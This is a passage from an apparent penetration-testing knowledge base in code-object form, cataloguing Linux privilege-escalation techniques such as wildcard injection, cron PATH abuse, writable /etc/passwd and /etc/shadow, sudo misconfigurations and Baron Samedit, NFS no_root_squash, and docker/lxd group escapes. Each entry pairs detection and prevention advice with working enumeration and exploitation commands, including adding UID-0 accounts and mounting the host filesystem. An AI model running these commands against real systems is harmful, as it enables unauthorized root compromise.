      'For a chown-based job (e.g. "chown -R user:user *"), create a file named "--reference=/tmp/attacker_owned_file" where /tmp/attacker_owned_file is a file you own with the target ownership, causing chown to apply your desired ownership to other files instead of the intended fix.',
      'For an rsync-based job, create a file named "-e sh shell.sh" (rsync interprets -e as specifying the remote shell command) to trigger execution of shell.sh with the job\'s privileges.',
      'After the payload executes as root, run /bin/bash -p to obtain a privileged interactive shell, or catch a reverse shell if that payload type was used instead.',
      'Document the exact wildcard injection variant used (tar checkpoint-action, chown --reference, rsync -e) since remediation differs slightly per command.'
    ],
    tools: ['pspy', 'LinPEAS', 'GTFOBins (wildcard entries for tar/chown/rsync)', 'DefenseCode wildcard research paper'],
    detection:
      'Command-line auditing via auditd execve logging captures the full argv of every tar/chown/rsync invocation, making wildcard-injection attempts ' +
      'visible as anomalous flags like --checkpoint-action appearing in what should be a routine backup job. File creation monitoring on directories ' +
      'targeted by privileged wildcard cron jobs can also flag suspicious filenames beginning with a hyphen.',
    prevention:
      'Never use unqualified wildcards in privileged scripts; always precede the glob with -- to terminate option parsing (tar czf archive.tar.gz -- *) ' +
      'or use ./* instead of a bare * so filenames cannot be misinterpreted as flags. Avoid running archival/permission cron jobs inside directories ' +
      'writable by non-root users, and prefer find -exec with explicit, quoted paths over shell globbing in privileged scripts.',
    real_world_examples: [
      { reference: 'DefenseCode "Abusing wildcards on Linux/Unix" (2014)', description: 'The foundational public research that catalogued wildcard injection against tar, chown, rsync, and other GNU coreutils/tar flags, forming the basis of the technique now built into LinPEAS and GTFOBins.' },
      { reference: 'GTFOBins tar wildcard entry', description: 'GTFOBins explicitly documents the tar --checkpoint-action=exec technique as a "Limited SUID" and cron-wildcard escalation path, and it remains a common finding in backup automation scripts across real production environments.' }
    ]
  },
  {
    id: 'linux-cron-path-abuse',
    name: 'Cron PATH Abuse (Insecure PATH Variable in Crontab Enabling Binary Hijacking)',
    category: 'Scheduled Task Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'System crontabs frequently define a custom PATH environment variable at the top of the file (e.g. PATH=/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin) ' +
      'that differs from a normal interactive shell\'s PATH, and cron jobs that invoke a command by its bare name (e.g. "run-backup" instead of ' +
      '"/usr/local/bin/run-backup") resolve that command by searching directories in the order listed in PATH. If any directory earlier in that search ' +
      'order than the legitimate binary\'s real location is writable by a lower-privileged user, that user can drop a malicious file with the same name as ' +
      'the target command into the writable directory. When the cron job next runs, the shell finds and executes the attacker\'s file first, running it ' +
      'with the privileges of the cron job -- typically root.\n\n' +
      'This is especially dangerous when the crontab PATH lists a user home directory (a common but poor practice for allowing personal cron scripts) ' +
      'ahead of /usr/bin and /bin, since any user can then place a same-named malicious script in their own home directory to hijack a system job\'s ' +
      'command resolution.',
    enumeration_commands: [
      { command: 'cat /etc/crontab', description: 'Read the PATH variable defined at the top of the system crontab.', what_to_look_for: 'Any directory in the PATH string that is writable by your user, especially a home directory or /tmp appearing before the standard system bin directories.' },
      { command: 'echo $PATH', description: 'Compare your own shell PATH against the crontab-defined PATH to identify differences.', what_to_look_for: 'Directories present in the crontab PATH but not typically writable-checked by admins.' },
      { command: 'find / -maxdepth 3 -writable -type d 2>/dev/null', description: 'List all writable directories up to a shallow depth to quickly cross-reference against the crontab PATH entries.', what_to_look_for: 'Overlap between this list and any directory named in a privileged crontab\'s PATH line.' },
      { command: 'crontab -l ; ls -la /var/spool/cron/crontabs/ 2>/dev/null', description: 'List your own crontab and, if permissions allow, enumerate other users\' crontab files for additional PATH definitions or job commands.', what_to_look_for: 'Bare (non-absolute-path) command invocations inside any readable crontab.' }
    ],
    exploitation_steps: [
      'Read /etc/crontab and any /etc/cron.d/* files to identify the exact PATH variable used for scheduled job resolution.',
      'Identify any cron job command that is invoked by bare name rather than a fully qualified absolute path.',
      'Check whether any directory listed in the PATH before the command\'s real location is writable by your current user (ls -la on each PATH component).',
      'If a writable directory is found earlier in the PATH, create a malicious file there with the exact same name as the target command (e.g. a fake "run-backup" script).',
      'Make the malicious file executable (chmod +x) and populate it with a payload such as adding your user to /etc/sudoers, setting a SUID bit on /bin/bash, or spawning a reverse shell.',
      'Wait for the cron schedule to trigger the job; the shell will resolve the bare command name to your malicious file before reaching the legitimate binary.',
      'Confirm privilege escalation succeeded via id or by catching the reverse shell connection, then obtain a stable root shell.'
    ],
    tools: ['pspy', 'LinPEAS', 'crontab', 'find'],
    detection:
      'Auditd path-write monitoring on directories referenced in system PATH variables, combined with process-lineage monitoring that flags cron ' +
      '(crond/cron) spawning a child process from an unexpected directory such as a user home folder, reliably detects this technique.',
    prevention:
      'Never include user-writable directories (especially home directories or /tmp) in a privileged crontab\'s PATH variable, and always invoke commands ' +
      'in scheduled jobs using their fully qualified absolute path rather than relying on PATH resolution. Restrict crontab PATH to root-owned, non-writable ' +
      'system directories only.',
    real_world_examples: [
      { reference: 'CWE-427 Uncontrolled Search Path Element', description: 'PATH-based command hijacking in cron jobs is formally classified under CWE-427 and is a routinely tested technique in OSCP-style Linux privilege escalation labs and real infrastructure audits.' },
      { reference: 'Common misconfiguration in shared hosting/dev environments', description: 'Development or shared hosting environments that add a developer home directory to a global or root crontab PATH for convenience are a recurring real-world source of this exact vulnerability.' }
    ]
  },
  {
    id: 'linux-writable-etc-passwd',
    name: 'Writable /etc/passwd Exploitation',
    category: 'Sensitive File Misconfiguration',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      '/etc/passwd historically stored password hashes directly, but on modern systems it only stores account metadata (username, UID, GID, home ' +
      'directory, shell) while the actual hash lives in the shadow-protected /etc/shadow. However, /etc/passwd still supports an inline password hash ' +
      'field for backward compatibility: if the second colon-delimited field of a line is a valid crypt() hash instead of the usual "x" placeholder, ' +
      'the system will authenticate against that hash directly rather than consulting /etc/shadow at all. If /etc/passwd is writable by a non-root user ' +
      '(due to an incorrect chmod, a misconfigured provisioning script, or being unintentionally included in a broader "chmod -R 777" style mistake), an ' +
      'attacker can append a completely new UID-0 user with a known password hash, or overwrite the root entry\'s hash field, and then simply log in or ' +
      '"su" to that account to obtain immediate root access.',
    enumeration_commands: [
      { command: 'ls -la /etc/passwd', description: 'Check the permission bits and ownership of /etc/passwd.', what_to_look_for: 'Any write permission (w) for group or other beyond the standard -rw-r--r-- root:root mode.' },
      { command: 'find / -writable -name passwd 2>/dev/null', description: 'Search for any writable file literally named "passwd" anywhere on the filesystem, in case /etc/passwd itself or a symlinked/alternate copy is writable.', what_to_look_for: 'A positive hit on /etc/passwd or a file that the system actually consults for authentication.' },
      { command: 'test -w /etc/passwd && echo WRITABLE', description: 'Directly test write access from the current shell context without relying on parsing ls output.', what_to_look_for: 'The literal "WRITABLE" output confirming write access.' }
    ],
    exploitation_steps: [
      'Confirm /etc/passwd is writable by your current user with test -w /etc/passwd.',
      'Generate a crypt-compatible password hash for a chosen password, e.g. openssl passwd -1 -salt xyz password123 to produce an MD5-crypt hash.',
      'Append a new root-equivalent line to /etc/passwd: echo \'rootbackup:$1$xyz$HASHVALUE:0:0:root:/root:/bin/bash\' >> /etc/passwd, using UID 0 and GID 0 to grant full root privileges.',
      'Switch to the newly created account: su rootbackup and enter the chosen password.',
      'Alternatively, overwrite the existing root line\'s password hash field directly (replacing the "x" placeholder with your generated hash) and then run su root with the chosen password.',
      'Verify escalation succeeded with id, confirming uid=0(root) gid=0(root).',
      'For a stealthier engagement, remove or restore the modified line after demonstrating impact, per the rules of engagement.'
    ],
    tools: ['openssl passwd', 'mkpasswd', 'LinPEAS'],
    detection:
      'File integrity monitoring on /etc/passwd (a standard AIDE/Tripwire/OSSEC baseline file) triggers an immediate alert on any modification. ' +
      'auditd file-write watches (auditctl -w /etc/passwd -p wa -k passwd_changes) log every write attempt along with the responsible process and user.',
    prevention:
      'Ensure /etc/passwd is always mode 0644 owned by root:root, never grant write access to non-root users or groups, and use file integrity monitoring ' +
      'to alert immediately on any unauthorized modification since this file is a critical trust anchor for the entire authentication system.',
    real_world_examples: [
      { reference: 'CWE-732 Incorrect Permission Assignment for Critical Resource', description: 'A writable /etc/passwd is one of the most severe possible misconfigurations on a Linux system and is treated as an immediate critical finding in any penetration test, as it provides deterministic, exploit-free root access.' },
      { reference: 'Provisioning script misconfiguration', description: 'Automated provisioning or configuration-management scripts (badly written Ansible/Puppet/Chef recipes) that recursively chmod a directory tree including /etc have repeatedly caused this exact misconfiguration in real production incidents.' }
    ]
  },
  {
    id: 'linux-writable-etc-shadow',
    name: 'Writable /etc/shadow Exploitation',
    category: 'Sensitive File Misconfiguration',
    difficulty: 'Low',
    likelihood: 'Rare',
    description:
      '/etc/shadow stores the actual salted password hashes for every local account and is normally mode 0640 or 0600, owned by root, and readable ' +
      'only by root or members of the shadow group. If /etc/shadow becomes writable by a non-root user -- through an incorrect chmod, a broken backup ' +
      'restore, or accidental inclusion in a permissive recursive permission change -- an attacker can directly overwrite the root account\'s password ' +
      'hash field with a hash of a password they know, then simply "su root" to authenticate. This is functionally similar to a writable /etc/passwd ' +
      'attack but targets the canonical password store directly and does not require creating a new account.',
    enumeration_commands: [
      { command: 'ls -la /etc/shadow', description: 'Check permission bits and ownership.', what_to_look_for: 'Any write bit (w) set for group or other, or ownership by a non-root user.' },
      { command: 'test -w /etc/shadow && echo WRITABLE', description: 'Direct write-access test from the current shell context.', what_to_look_for: 'Literal "WRITABLE" output.' },
      { command: 'cat /etc/shadow 2>/dev/null', description: 'Attempt to read the file outright; a writable file is very often also readable.', what_to_look_for: 'Successful output revealing hash formats (e.g. $6$ for SHA-512 crypt) useful for offline cracking even if write access is not confirmed.' }
    ],
    exploitation_steps: [
      'Confirm write access to /etc/shadow with test -w /etc/shadow.',
      'Generate a new password hash: openssl passwd -6 -salt xyz newpassword123 to produce a SHA-512 crypt hash compatible with modern shadow entries.',
      'Locate the root line in /etc/shadow and replace its second field (the hash, between the first and second colon) with the newly generated hash, preserving all other fields (last change day, min/max age, etc.).',
      'Save the file and run su root, entering the chosen password to authenticate as root directly.',
      'Verify escalation with id, confirming uid=0(root).',
      'Restore the original hash value after demonstrating impact if the engagement rules of engagement require minimizing changes to the target.'
    ],
    tools: ['openssl passwd', 'mkpasswd', 'LinPEAS'],
    detection:
      'File integrity monitoring on /etc/shadow is a standard control in every hardening baseline (CIS, DISA STIG) and will flag any modification ' +
      'immediately; auditd write-watches on /etc/shadow log the responsible process and user for every write attempt.',
    prevention:
      'Keep /etc/shadow at mode 0640 or stricter, owned by root:shadow, never grant write access outside root, and monitor the file with integrity ' +
      'checking tools since it is one of the highest-value targets on any Linux host.',
    real_world_examples: [
      { reference: 'CWE-732 Incorrect Permission Assignment', description: 'A writable /etc/shadow is treated as a critical-severity finding in every professional penetration test methodology, functionally equivalent to instant root.' },
      { reference: 'Backup/restore tooling misconfiguration', description: 'Improperly configured backup restoration scripts that extract archives with the archiver\'s default umask rather than preserving original file modes have caused this exact issue in real incident postmortems.' }
    ]
  },
  {
    id: 'linux-sudo-misconfig',
    name: 'Sudo Misconfigurations (NOPASSWD Rules, sudo -l Bypasses, and the Baron Samedit CVE-2021-3156 Heap Overflow)',
    category: 'Sudo Exploitation',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'Sudo is the primary mechanism for delegating specific administrative commands to non-root users, but three broad classes of sudo issues ' +
      'consistently lead to full root compromise. First, overly permissive sudoers entries: NOPASSWD:ALL grants passwordless root on any command, but ' +
      'even narrowly scoped entries are frequently exploitable because the allowed binary itself has a documented GTFOBins "sudo" function (vim, less, ' +
      'find, python, awk, and dozens of others can all shell out even when invoked through sudo with a restricted command path). Second, wildcard or ' +
      'incomplete path specifications in sudoers (e.g. allowing sudo /usr/bin/find /var/log -name "*.log" without restricting further arguments) let a ' +
      'user pass additional flags that trigger a shell escape or arbitrary file read/write as root. Third, sudo itself has shipped multiple critical ' +
      'memory-corruption vulnerabilities; the most significant recent example is CVE-2021-3156 ("Baron Samedit"), a heap-based buffer overflow in sudo\'s ' +
      'command-line parsing of escaped backslash characters in sudoedit/sudo -s, discovered by Qualys in January 2021, affecting virtually every sudo ' +
      'version from 1.8.2 through 1.9.5p1, and exploitable by any local user regardless of sudoers configuration to obtain root without any password.',
    enumeration_commands: [
      { command: 'sudo -l', description: 'List the commands the current user is permitted to run via sudo, with or without a password.', what_to_look_for: 'NOPASSWD entries, wildcard arguments, or any binary present on GTFOBins with a documented "sudo" bypass function.' },
      { command: 'sudo -V | head -1', description: 'Print the installed sudo version to check against known CVEs.', what_to_look_for: 'Version strings between 1.8.2 and 1.9.5p1 (vulnerable to CVE-2021-3156) or other known-vulnerable ranges.' },
      { command: 'cat /etc/sudoers /etc/sudoers.d/* 2>/dev/null', description: 'Directly read the sudoers configuration if readable, to see the raw rule syntax including any env_keep or NOEXEC exceptions.', what_to_look_for: 'env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH entries, which permit environment-variable-based escalation even for restricted commands.' },
      { command: 'sudoedit -s /', description: 'A specific probe used to trigger and confirm the CVE-2021-3156 heap overflow condition (crashing with a "malloc(): corrupted..." or segfault indicates likely vulnerability, pending full PoC use).', what_to_look_for: 'A memory-corruption crash message confirming the sudoedit parsing bug is present.' }
    ],
    exploitation_steps: [
      'Run sudo -l to enumerate exactly which commands, if any, the current user can run as root, noting NOPASSWD flags and any wildcards.',
      'For every allowed binary, check GTFOBins under the "sudo" function column for a documented technique (e.g. sudo vim -c \':!/bin/sh\', sudo find . -exec /bin/sh \\; -quit, sudo python3 -c \'import os;os.system("/bin/sh")\').',
      'If a wildcard is present in an allowed path (e.g. sudo tar -czf /backup/*.tar.gz /home/user/*), consider whether additional arguments can be smuggled in to trigger a checkpoint/exec-style escape similar to cron wildcard injection.',
      'If env_keep includes LD_PRELOAD or LD_LIBRARY_PATH for an allowed command, compile a malicious shared library exposing an init constructor that calls setuid(0) and execve("/bin/sh"), then run: sudo LD_PRELOAD=/tmp/evil.so allowed_command.',
      'If sudo -V reports a version between 1.8.2 and 1.9.5p1, download and compile a Baron Samedit (CVE-2021-3156) proof-of-concept exploit, which abuses a heap buffer overflow triggered by crafting the program name (argv[0]) and escaped arguments passed to sudoedit -s or sudo -s, granting root without requiring any sudo rule to already exist for the current user.',
      'Compile the Baron Samedit exploit locally on a matching or compatible build environment (glibc version matters), run it against the target, and confirm a root shell is returned.',
      'For simple NOPASSWD:ALL misconfigurations, directly run sudo /bin/bash or sudo su - to obtain an interactive root shell with no further exploitation required.',
      'Document the exact sudoers rule or CVE exploited, since remediation (tightening the sudoers line versus patching the sudo package) differs.'
    ],
    tools: ['GTFOBins (sudo column)', 'sudo -l', 'CVE-2021-3156 public PoC exploits', 'LinPEAS', 'linux-exploit-suggester'],
    detection:
      'auditd and sudo\'s own logging (/var/log/auth.log or /var/log/secure) record every sudo invocation including the exact command executed; ' +
      'centralized log analysis (SIEM correlation rules) should alert on sudo invocations of interpreters, editors, or pagers, and on any sudo/sudoedit ' +
      'process that crashes or is followed immediately by a root-owned child shell. Vulnerability scanning that tracks installed sudo package versions ' +
      'against the NVD is essential for catching CVE-2021-3156 exposure before exploitation.',
    prevention:
      'Apply the principle of least privilege in sudoers: avoid NOPASSWD:ALL entirely, scope command paths precisely with no wildcards, use the ' +
      'command-specific argument restriction features of sudoers where possible, strip LD_PRELOAD/LD_LIBRARY_PATH from env_keep, and enable NOEXEC to ' +
      'block shell-escapes from within allowed commands where feasible. Patch sudo promptly (1.9.5p2 or later resolves CVE-2021-3156) and track sudo ' +
      'package versions as part of routine vulnerability management.',
    real_world_examples: [
      { reference: 'CVE-2021-3156 (Baron Samedit)', description: 'A heap-based buffer overflow in sudo discovered by Qualys, present in default installations of most major Linux distributions for roughly a decade (sudo 1.8.2 through 1.9.5p1), exploitable by any local user without any sudoers permissions to gain immediate root, with public exploit code widely available within days of disclosure.' },
      { reference: 'GTFOBins sudo bypass techniques', description: 'GTFOBins documents sudo bypass techniques for over 100 binaries; misconfigured narrowly-scoped sudo rules that nonetheless allow one of these binaries are a top-tier finding in essentially every Linux-focused penetration test.' },
      { reference: 'CVE-2019-14287 (sudo user ID -1/4294967295 bypass)', description: 'A logic flaw allowing a user with a sudoers rule specifying "ALL, !root" (intended to allow running commands as any user except root) to bypass the restriction by specifying a user ID of -1 or 4294967295, which sudo interpreted as UID 0, granting unintended root access.' }
    ]
  },
  {
    id: 'linux-path-hijacking',
    name: 'PATH Environment Variable Hijacking',
    category: 'Environment Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'When any privileged process -- a SUID binary, a root-owned script, a service -- invokes an external command by its bare name rather than a ' +
      'fully qualified absolute path, the operating system resolves that name by searching each directory listed in the PATH environment variable, in ' +
      'order, until a matching executable is found. If the calling user can control or influence the PATH variable inherited by that privileged process ' +
      '(because PATH is not reset/sanitized before privilege elevation, or because a writable directory appears earlier in the search order than the ' +
      'legitimate binary), the attacker can place a malicious executable with the target name in a directory they control, causing the privileged ' +
      'process to run attacker code instead of the intended system binary. This is a foundational technique that underlies cron PATH abuse, SUID custom ' +
      'binary exploitation, and many script-based misconfigurations.',
    enumeration_commands: [
      { command: 'echo $PATH', description: 'Display the current PATH to identify its full search order.', what_to_look_for: 'Any directory (especially "." or a home directory) that is writable by the current user and appears before standard system directories.' },
      { command: 'find / -writable -type d 2>/dev/null | grep -Ff <(echo $PATH | tr ":" "\\n")', description: 'Cross-reference writable directories against the components of the current PATH.', what_to_look_for: 'Any overlap indicating a hijackable PATH component.' },
      { command: 'strings /path/to/suid-binary | grep -v "^/"  (for command-like tokens without a leading slash)', description: 'Inspect a target SUID/privileged binary\'s strings output for command invocations lacking an absolute path.', what_to_look_for: 'Bare command names like "service", "ps", or "id" used inside the binary via system()/popen()/execvp().' }
    ],
    exploitation_steps: [
      'Identify a privileged binary or script (SUID binary, root cron job, sudo-allowed command) that invokes an external command by bare name rather than absolute path.',
      'Confirm via strings/ltrace/strace or by reading the script source exactly which command name is being resolved via PATH.',
      'Find or create a directory that is both writable by your user and earlier in the effective PATH search order than the legitimate command\'s real location.',
      'Write a malicious script or binary with the exact target command name in that writable directory (e.g. a fake "ls" or "service" script) and make it executable.',
      'If necessary, explicitly export a manipulated PATH before triggering the privileged process: export PATH=/tmp/evil:$PATH.',
      'Trigger the privileged process (run the SUID binary, wait for the cron job, invoke the sudo-allowed command) so it resolves and executes your malicious file instead of the legitimate one.',
      'Confirm the malicious payload executed with elevated privileges (e.g. spawned a root shell or set a SUID bit), then obtain a stable privileged shell.'
    ],
    tools: ['GTFOBins', 'LinPEAS', 'strace', 'ltrace'],
    detection:
      'auditd execve logging captures the full resolved path of every executed binary; alerting on a privileged process executing a binary from a ' +
      'non-standard directory (outside /bin, /usr/bin, /sbin, /usr/sbin) is highly effective at catching PATH hijacking in real time.',
    prevention:
      'Privileged code should always invoke external commands with a fully qualified absolute path and should explicitly reset PATH to a known-safe ' +
      'value (e.g. PATH=/usr/bin:/bin at the top of any root-run script) rather than trusting the inherited environment.',
    real_world_examples: [
      { reference: 'CWE-427 Uncontrolled Search Path Element', description: 'PATH hijacking is the textbook example of CWE-427 and appears constantly across both custom SUID binaries and privileged scripts in real-world assessments and structured training labs alike.' }
    ]
  },
  {
    id: 'linux-nfs-no-root-squash',
    name: 'NFS no_root_squash Exploitation',
    category: 'Network File System Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'Network File System (NFS) exports can be configured with the no_root_squash option in /etc/exports, which disables the default "root squash" ' +
      'security behavior that normally maps a remote root user\'s UID 0 requests down to an unprivileged "nobody" account on the server. When ' +
      'no_root_squash is set, a client that mounts the export as root retains root privileges on the files it creates on the server. Because NFSv3 (and ' +
      'NFSv4 without Kerberos) relies entirely on client-supplied UID/GID values with no cryptographic authentication of identity, any attacker who can ' +
      'become root on any machine that is permitted to mount the export -- or who can simply become root on their own attacker-controlled machine and ' +
      'mount the share -- can create a SUID-root binary on the exported filesystem and then execute it directly on the NFS server (or on any other host ' +
      'sharing the export) to escalate to root there as well.',
    enumeration_commands: [
      { command: 'cat /etc/exports  (on a machine believed to be an NFS server)', description: 'Read the local NFS export configuration to check for no_root_squash.', what_to_look_for: 'Export lines containing the literal string no_root_squash.' },
      { command: 'showmount -e TARGET_IP', description: 'Query a remote NFS server for its list of exported shares from an attacker-controlled machine.', what_to_look_for: 'Any exported path, especially ones with broad client access (*, or a wide CIDR range).' },
      { command: 'cat /proc/mounts | grep nfs', description: 'On a client system, list currently mounted NFS shares and their mount options.', what_to_look_for: 'Mount options lacking root_squash-related restrictions, though this must be corroborated with the server-side /etc/exports.' }
    ],
    exploitation_steps: [
      'From an attacker-controlled Linux machine where you have root, identify a target NFS export with showmount -e TARGET_IP.',
      'Mount the export locally as root: mkdir /mnt/nfs && mount -o rw,vers=3 TARGET_IP:/exported/path /mnt/nfs.',
      'Confirm the export is not root-squashed by creating a file as root inside the mount and checking its ownership from the client side (touch /mnt/nfs/test && ls -la /mnt/nfs/test showing root:root).',
      'Write a small C program that calls setuid(0); setgid(0); system("/bin/bash"); compile it locally, copy the compiled binary onto the mounted share, and set the SUID bit: cp payload /mnt/nfs/payload && chmod 4755 /mnt/nfs/payload.',
      'On the target machine (or any other host that also mounts this same export with a lower-privileged local user), navigate to the corresponding local mount path and execute the SUID payload: /mounted/path/payload.',
      'Because the SUID bit and root ownership were preserved by the no_root_squash export, executing the binary on the target grants a root shell there.',
      'Verify escalation with id, then stabilize the shell.'
    ],
    tools: ['showmount', 'nfs-utils / mount.nfs', 'gcc'],
    detection:
      'Network-level detection of NFS mount and RPC portmapper traffic from unexpected source IPs, combined with periodic auditing of /etc/exports across ' +
      'all NFS servers for no_root_squash entries, is the primary defense. File integrity monitoring that flags newly created SUID binaries on NFS-backed ' +
      'paths is also highly effective.',
    prevention:
      'Avoid no_root_squash entirely unless there is a specific, well-understood requirement; default to root_squash (the standard behavior) so remote ' +
      'root is always mapped to nobody:nogroup on the server. Where NFS must be used, prefer NFSv4 with Kerberos authentication (sec=krb5p) rather than ' +
      'the UID/GID trust model of NFSv3, and restrict exports to specific, tightly scoped client IP addresses rather than broad ranges or wildcards.',
    real_world_examples: [
      { reference: 'CWE-863 Incorrect Authorization', description: 'NFS no_root_squash misconfiguration is a long-documented technique in penetration testing methodology (including OSCP coursework) that reliably yields root when found, since it requires no software vulnerability at all -- only a trust-model misconfiguration.' }
    ]
  },
  {
    id: 'linux-docker-group-escape',
    name: 'Docker Group Membership Escape (Container Mount / Privileged Container Abuse)',
    category: 'Container Escape',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'Membership in the local "docker" group is functionally equivalent to root access on the host, even though this is frequently misunderstood and ' +
      'granted casually to developers "so they don\'t need sudo for docker commands." The Docker daemon socket (/var/run/docker.sock) runs with root ' +
      'privileges, and the docker CLI communicates with it without any further privilege check once the calling user can access the socket (by group ' +
      'membership or direct socket permissions). Any user who can run docker commands can launch a new container with the host\'s root filesystem bind- ' +
      'mounted inside it (docker run -v /:/mnt --rm -it alpine chroot /mnt sh), immediately granting a root shell with full read/write access to the ' +
      'entire host filesystem. A parallel technique applies if a user can run an already-configured "privileged" container (--privileged flag) or one ' +
      'with excessive Linux capabilities/host namespace sharing (--pid=host, --net=host, or extra --cap-add flags), all of which can be leveraged to ' +
      'break out to the underlying host.',
    enumeration_commands: [
      { command: 'id', description: 'Check group memberships of the current user.', what_to_look_for: 'The literal group name "docker" in the output.' },
      { command: 'ls -la /var/run/docker.sock', description: 'Check the ownership and permission bits on the Docker socket directly.', what_to_look_for: 'Group ownership of docker with rw permission for that group, or world-writable permissions on the socket.' },
      { command: 'docker ps ; docker images', description: 'Confirm functional access to the Docker daemon by listing running containers and locally cached images.', what_to_look_for: 'Successful command output (no permission denied error) confirming usable Docker access.' }
    ],
    exploitation_steps: [
      'Confirm docker group membership or direct socket access with id and by testing docker ps for success.',
      'Run a new container with the host root filesystem bind-mounted: docker run -v /:/mnt --rm -it alpine chroot /mnt sh (substitute alpine for any locally available image).',
      'Inside the resulting shell, the chroot into /mnt means all filesystem operations are actually happening against the host\'s real root filesystem with root privileges.',
      'Use this access to add a new root-equivalent entry to the host\'s /etc/passwd and /etc/shadow, drop a SUID bash binary, or write an SSH authorized_keys entry for direct host access.',
      'Exit the container and authenticate to the host directly using the newly created backdoor (su, ssh, or executing the SUID binary from the actual host shell).',
      'As an alternative if bind-mounting is restricted, check for any existing privileged container (docker ps and docker inspect CONTAINER_ID looking for "Privileged": true) and docker exec into it, then perform a standard privileged-container host escape (mounting the host\'s disk device directly via /dev, or abusing shared host namespaces).',
      'Verify host-level root access was obtained, then stabilize access and document the exact docker group or socket permission finding.'
    ],
    tools: ['docker CLI', 'LinPEAS', 'GTFOBins (docker sudo/SUID entries)'],
    detection:
      'Docker daemon audit logging (or dockerd\'s API access logs when enabled) records every container creation event including mount flags; alerting on ' +
      'any docker run invocation that bind-mounts the host root filesystem (-v /:/something) or uses --privileged is a high-value detection rule. ' +
      'Restricting and monitoring docker group membership via periodic /etc/group audits is equally important.',
    prevention:
      'Treat docker group membership as equivalent to root and grant it only to fully trusted administrators; where developer convenience is required, ' +
      'use rootless Docker, Podman in rootless mode, or a properly scoped Docker API proxy that restricts mount and privilege options. Avoid ' +
      '--privileged containers in production, and apply seccomp/AppArmor profiles plus dropped capabilities by default.',
    real_world_examples: [
      { reference: 'GTFOBins docker entry (sudo/SUID/shell functions)', description: 'GTFOBins documents docker as both a SUID and sudo escalation vector precisely because any usable Docker access equates to host root, making it one of the most impactful group-membership misconfigurations catalogued.' },
      { reference: 'CIS Docker Benchmark control 2.1', description: 'The CIS Docker Benchmark explicitly recommends restricting docker group membership and never running containers with unnecessary privileges, reflecting how frequently this exact escalation path is found in real cloud and DevOps environments.' }
    ]
  },
  {
    id: 'linux-lxd-lxc-group-escape',
    name: 'LXC/LXD Group Membership Container Escape',
    category: 'Container Escape',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'Similar to the Docker group, membership in the "lxd" (or legacy "lxc") group grants effective root on the host because the LXD daemon runs as ' +
      'root and group members can create and configure containers via the lxc/lxd command-line client without further authorization checks. The ' +
      'canonical escalation technique imports or builds a custom LXD image profile with security.privileged=true and no restrictive AppArmor/namespace ' +
      'confinement, then bind-mounts the host\'s root filesystem into the container, granting the calling user a root-level view of and write access to ' +
      'the entire host disk from inside the container.',
    enumeration_commands: [
      { command: 'id', description: 'Check group memberships for lxd or lxc.', what_to_look_for: 'The literal group name "lxd" or "lxc" in the output.' },
      { command: 'lxc list ; lxd --version', description: 'Confirm functional LXD access and note the installed version for exploit compatibility.', what_to_look_for: 'Successful command output rather than a permission-denied error.' },
      { command: 'lxc image list', description: 'Check for locally cached or available container images that could be used to build a privileged container.', what_to_look_for: 'Any available base image (Alpine, Ubuntu) that can be imported or launched.' }
    ],
    exploitation_steps: [
      'Confirm lxd/lxc group membership with id.',
      'Build or download a minimal Alpine-based LXD image using distrobuilder, or import an existing standard image with lxc image import.',
      'Initialize a new privileged container from that image: lxc init IMAGE_ALIAS privesc -c security.privileged=true.',
      'Attach the host\'s root filesystem as a device inside the container: lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true.',
      'Start the container and shell into it: lxc start privesc && lxc exec privesc /bin/sh.',
      'Inside the container shell, navigate to /mnt/root, which is the host\'s actual root filesystem, now accessible with full read/write privileges because the container is privileged and unconfined.',
      'Use this access to add a root-equivalent user to /mnt/root/etc/passwd and /mnt/root/etc/shadow, or drop a SUID binary, then authenticate directly on the host using the new backdoor.',
      'Verify host root was obtained and document the LXD group membership finding.'
    ],
    tools: ['lxc/lxd CLI', 'distrobuilder', 'LinPEAS', 'GTFOBins (lxd/lxc entries)'],
    detection:
      'LXD API/audit logging of container creation and device-attachment operations reveals privileged container creation with host disk devices ' +
      'attached; periodic /etc/group audits for lxd/lxc membership are the primary preventive detection control.',
    prevention:
      'Restrict lxd/lxc group membership to fully trusted administrators only, since it is equivalent to root; where possible, apply LXD project-level ' +
      'restrictions (security.privileged=false enforced at the project level) to prevent group members from creating unconfined privileged containers.',
    real_world_examples: [
      { reference: 'GTFOBins lxd/lxc entries', description: 'GTFOBins documents the exact device-attachment escalation chain for both lxd and lxc, and it remains one of the most reliable group-membership-to-root techniques on Ubuntu systems where LXD ships by default via snap.' }
    ]
  },
  {
    id: 'linux-wildcard-injection-general',
    name: 'General Wildcard/Argument Injection Against Privileged Scripts (tar, chown, rsync, zip, 7z)',
    category: 'Argument Injection',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'Beyond the cron-specific scenario, any privileged script or SUID/sudo-permitted command that expands a shell wildcard over a directory an ' +
      'attacker can write to is vulnerable to argument injection, regardless of how it is triggered (a manually invoked admin script, a systemd service ' +
      'ExecStart line, a sudo-permitted command). The underlying flaw is always the same: the shell performs glob expansion before the target program ' +
      'ever runs, and filenames starting with a hyphen are indistinguishable from command-line flags once expanded into argv. GNU tar\'s ' +
      '--checkpoint-action=exec, chown/chmod\'s --reference, rsync\'s -e (remote shell) and --rsync-path, and zip\'s -T --unzip-command are the most ' +
      'commonly abused flags, each letting a filename act as a smuggled option that ultimately achieves command execution or a privileged file operation.',
    enumeration_commands: [
      { command: 'grep -rE "\\*" /etc/cron.*  /opt/*/scripts /usr/local/*/scripts 2>/dev/null', description: 'Search common script locations for wildcard usage inside privileged automation.', what_to_look_for: 'Any tar, chown, chmod, rsync, or zip invocation using a bare * over a directory you can write to.' },
      { command: 'ls -la <candidate-directory>', description: 'Confirm write access to the directory the wildcard expands over.', what_to_look_for: 'World- or group-writable directory permissions.' },
